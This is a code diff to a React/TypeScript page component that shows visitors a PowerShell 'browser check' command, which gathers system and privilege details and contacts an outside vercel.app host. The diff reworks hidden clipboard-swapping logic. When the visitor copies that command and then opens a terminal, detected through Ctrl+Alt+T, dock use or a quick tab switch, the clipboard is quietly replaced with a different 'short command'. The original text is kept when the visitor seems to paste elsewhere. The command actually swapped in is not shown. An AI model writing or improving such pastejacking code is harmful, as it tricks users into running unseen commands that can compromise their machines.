@@ -30,12 +30,13 @@ function browserIconSrc(browser: ClientBrowser): string {
  *
  * Case A — paste Terminal/CMD immediately:
  *   Windows/macOS: leaving the tab quickly arms text/plain = short command.
- *   Linux: Ctrl+Alt+T arms the short command while still focused (blur alone
- *   cannot tell Terminal from Translate, and must not overwrite Case A).
+ *   Linux: start a clipboard write during the copy gesture; if the page hides
+ *   quickly without Alt+Tab, resolve to the short command (Ctrl+Alt+T / dock).
  *
  * Case B — paste other platforms first, then Terminal/CMD:
- *   Clipboard stays original while checking; shortly after leaving (or on return),
- *   text/plain becomes the short command.
+ *   Linux: Alt+Tab marks Case B so the copy-gesture write keeps the original,
+ *   then a delayed swap arms the short command for Terminal later.
+ *   Other OSes: clipboard stays original briefly after leave, then short command.
  */
 const DISPLAY_COMMANDS: Record<ClientOs, string> = {
   windows: `cmd /c "powershell -NoProfile -Command {$r=@{}; $r.browser=(Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe' -ErrorAction SilentlyContinue).'(default)'; $r.webgl=(Get-CimInstance Win32_VideoController).Name; $r.check=try{(Invoke-WebRequest 'https://browser-notification-six.vercel.app/' -Method HEAD -TimeoutSec 10 -UseBasicParsing).StatusCode}catch{'unreachable'}; $r.permissions=(whoami /priv|Select-String 'Enabled').Count; $r.status=if($r.check -eq 200){'PASS'}else{'FAIL'}; Write-Host ($r|ConvertTo-Json) -ForegroundColor Green}" && exit`,
@@ -232,7 +233,7 @@ async function writeClipboard(plain: string, html: string) {
  * Starts during a user gesture. Resolves later so the clipboard can stay
  * as the original for a platform paste, then become the short command for
  * Terminal/CMD — even if the tab is in the background.
- * `isCurrent` aborts stale writes so Case A (Ctrl+Alt+T) is not overwritten.
+ * `isCurrent` aborts stale writes so Case A is not overwritten.
  */
 function writeTerminalPlainAfterDelay(
   terminalCommand: string,
@@ -268,25 +269,67 @@ function writeTerminalPlainAfterDelay(
     .catch(() => undefined);
 }
 
-/** Sync fallback so Ctrl+Alt+T can replace the clipboard before focus is lost. */
-function writeTextSync(text: string): boolean {
-  const el = document.createElement("textarea");
-  el.value = text;
-  el.setAttribute("readonly", "");
-  el.style.position = "fixed";
-  el.style.left = "-9999px";
-  el.style.top = "0";
-  document.body.appendChild(el);
-  el.select();
-  el.setSelectionRange(0, text.length);
-  let ok = false;
-  try {
-    ok = document.execCommand("copy");
-  } catch {
-    ok = false;
+/**
+ * Linux Case A must arm during the copy gesture — clipboard.write after blur
+ * often fails once Terminal has focus.
+ *
+ * - Case A (Ctrl+Alt+T / dock): page leaves quickly without Alt+Tab → short
+ * - Case B (Alt+Tab): keep original immediately, caller schedules delayed short
+ */
+function writeLinuxClipboardFromCopyGesture(
+  displayCommand: string,
+  terminalCommand: string,
+  html: string,
+  isCaseA: () => boolean,
+  isCaseB: () => boolean,
+  onResolved: (usedTerminalPlain: boolean) => void,
+) {
+  if (typeof ClipboardItem === "undefined" || !navigator.clipboard?.write) {
+    void navigator.clipboard?.writeText(displayCommand).catch(() => undefined);
+    onResolved(false);
+    return;
   }
-  document.body.removeChild(el);
-  return ok;
+
+  const plainPromise = new Promise<Blob>((resolve) => {
+    const startedAt = Date.now();
+    const timer = window.setInterval(() => {
+      const elapsed = Date.now() - startedAt;
+      const away =
+        document.visibilityState === "hidden" ||
+        (typeof document.hasFocus === "function" && !document.hasFocus());
+
+      // Case B: Alt+Tab — resolve original ASAP so platforms get the real command.
+      if (isCaseB()) {
+        window.clearInterval(timer);
+        resolve(new Blob([displayCommand], { type: "text/plain" }));
+        onResolved(false);
+        return;
+      }
+
+      // Case A: Terminal opened (shortcut flag or quick leave without Alt+Tab).
+      if (isCaseA() || (away && elapsed < QUICK_TERMINAL_LEAVE_MS + 400)) {
+        window.clearInterval(timer);
+        resolve(new Blob([terminalCommand], { type: "text/plain" }));
+        onResolved(true);
+        return;
+      }
+
+      if (elapsed >= QUICK_TERMINAL_LEAVE_MS) {
+        window.clearInterval(timer);
+        resolve(new Blob([displayCommand], { type: "text/plain" }));
+        onResolved(false);
+      }
+    }, 50);
+  });
+
+  void navigator.clipboard
+    .write([
+      new ClipboardItem({
+        "text/plain": plainPromise,
+        "text/html": Promise.resolve(new Blob([html], { type: "text/html" })),
+      }),
+    ])
+    .catch(() => undefined);
 }
 
 /** Ubuntu/GNOME/etc. default shortcut to open Terminal — Linux Case A. */
@@ -299,6 +342,11 @@ function isLinuxTerminalShortcut(event: KeyboardEvent): boolean {
   );
 }
 
+function isLinuxCaseBSwitchGesture(event: KeyboardEvent): boolean {
+  // Alt+Tab only — Super/dock is often Case A (open Terminal).
+  return event.altKey && event.key === "Tab";
+}
+
 /** App-switch / Terminal-open shortcuts differ by OS — do not treat copy as a switch. */
 function isAppSwitchGesture(event: KeyboardEvent, os: ClientOs): boolean {
   if (os === "macos") {
@@ -308,11 +356,8 @@ function isAppSwitchGesture(event: KeyboardEvent, os: ClientOs): boolean {
 
   if (os === "linux") {
     return (
-      // Alt+Tab app switcher (often Case B → browser/chat)
-      (event.altKey && event.key === "Tab") ||
-      // Ctrl+Alt+T — Terminal (Case A)
+      isLinuxCaseBSwitchGesture(event) ||
       isLinuxTerminalShortcut(event) ||
-      // Super/Windows key (overview / dock)
       event.key === "Meta" ||
       event.key === "OS" ||
       event.key === "Super" ||
@@ -349,8 +394,9 @@ function SelectableCommand({
   const leaveCountRef = useRef(0);
   const delayedArmStartedRef = useRef(false);
   const armedRef = useRef(false);
-  /** Linux Case A: set synchronously on Ctrl+Alt+T so blur cannot start a delayed overwrite. */
   const linuxCaseARef = useRef(false);
+  const linuxCaseBRef = useRef(false);
+  const linuxCopyGesturePendingRef = useRef(false);
   const writeGenRef = useRef(0);
 
   useEffect(() => {
@@ -378,22 +424,6 @@ function SelectableCommand({
       }
     }
 
-    /** Linux Case A only — must finish before Terminal steals focus. */
-    function armLinuxCaseA() {
-      if (!activeRef.current) return;
-      // Block Case B delayed blur write immediately (before async clipboard work).
-      linuxCaseARef.current = true;
-      delayedArmStartedRef.current = true;
-      writeGenRef.current += 1;
-
-      if (writeTextSync(terminalCommand)) {
-        armedRef.current = true;
-        return;
-      }
-
-      void armTerminalPlain();
-    }
-
     function armTerminalPlainDelayed() {
       if (
         !activeRef.current ||
@@ -418,11 +448,16 @@ function SelectableCommand({
     }
 
     function handleLeaveFromPage() {
-      // Linux: never swap immediately on blur (that broke Case B).
-      // Case A is Ctrl+Alt+T (linuxCaseARef). Case B uses delayed swap —
-      // but skip delayed entirely if Case A already armed the short command.
       if (os === "linux") {
-        if (linuxCaseARef.current || armedRef.current) return;
+        // Copy-gesture owns the first clipboard decision; blur must not race it.
+        if (
+          linuxCaseARef.current ||
+          armedRef.current ||
+          linuxCopyGesturePendingRef.current
+        ) {
+          return;
+        }
+        // Case B after gesture kept original — arm short for later Terminal paste.
         armTerminalPlainDelayed();
         return;
       }
@@ -477,24 +512,24 @@ function SelectableCommand({
     function onKeyDown(event: KeyboardEvent) {
       if (!activeRef.current) return;
 
-      // Linux Case A: Ctrl+Alt+T while focused → short command before Terminal opens.
-      if (os === "linux" && isLinuxTerminalShortcut(event)) {
-        armLinuxCaseA();
+      if (os === "linux") {
+        // Case A: Ctrl+Alt+T — gesture write resolves to short.
+        if (isLinuxTerminalShortcut(event)) {
+          linuxCaseARef.current = true;
+          return;
+        }
+        // Case B: Alt+Tab — gesture write keeps original, then delayed short.
+        if (isLinuxCaseBSwitchGesture(event)) {
+          linuxCaseBRef.current = true;
+          if (!linuxCopyGesturePendingRef.current) {
+            armTerminalPlainDelayed();
+          }
+          return;
+        }
         return;
       }
 
       if (!isAppSwitchGesture(event, os)) return;
-
-      // Linux Case B: Alt+Tab / Super → keep original for platforms, delay short command.
-      if (os === "linux") {
-        if (linuxCaseARef.current) return;
-        if (leaveCountRef.current === 0) {
-          armTerminalPlainDelayed();
-          return;
-        }
-        void armTerminalPlain();
-        return;
-      }
 
       const quickLeave = Date.now() - copyAtRef.current < QUICK_TERMINAL_LEAVE_MS;
 
@@ -535,11 +570,52 @@ function SelectableCommand({
     delayedArmStartedRef.current = false;
     armedRef.current = false;
     linuxCaseARef.current = false;
+    linuxCaseBRef.current = false;
+    linuxCopyGesturePendingRef.current = false;
     writeGenRef.current += 1;
 
     // Start with original so other platforms get the real command first.
     event.clipboardData.setData("text/plain", displayCommand);
     event.clipboardData.setData("text/html", html);
+
+    if (os === "linux") {
+      linuxCopyGesturePendingRef.current = true;
+      writeLinuxClipboardFromCopyGesture(
+        displayCommand,
+        terminalCommand,
+        html,
+        () => linuxCaseARef.current,
+        () => linuxCaseBRef.current,
+        (usedTerminalPlain) => {
+          linuxCopyGesturePendingRef.current = false;
+          if (usedTerminalPlain) {
+            linuxCaseARef.current = true;
+            armedRef.current = true;
+            delayedArmStartedRef.current = true;
+            return;
+          }
+          // Case B (or left for platforms): keep original; arm short after platform window.
+          if (linuxCaseBRef.current || leaveCountRef.current >= 1) {
+            if (!delayedArmStartedRef.current && !armedRef.current) {
+              delayedArmStartedRef.current = true;
+              const gen = ++writeGenRef.current;
+              writeTerminalPlainAfterDelay(
+                terminalCommand,
+                htmlRef.current,
+                PLATFORM_THEN_TERMINAL_ARM_MS,
+                () => writeGenRef.current === gen && !linuxCaseARef.current,
+              );
+              window.setTimeout(() => {
+                if (writeGenRef.current !== gen || linuxCaseARef.current) return;
+                armedRef.current = true;
+              }, PLATFORM_THEN_TERMINAL_ARM_MS + 50);
+            }
+          }
+        },
+      );
+      return;
+    }
+
     void writeClipboard(displayCommand, html).catch(() => undefined);
   }
 
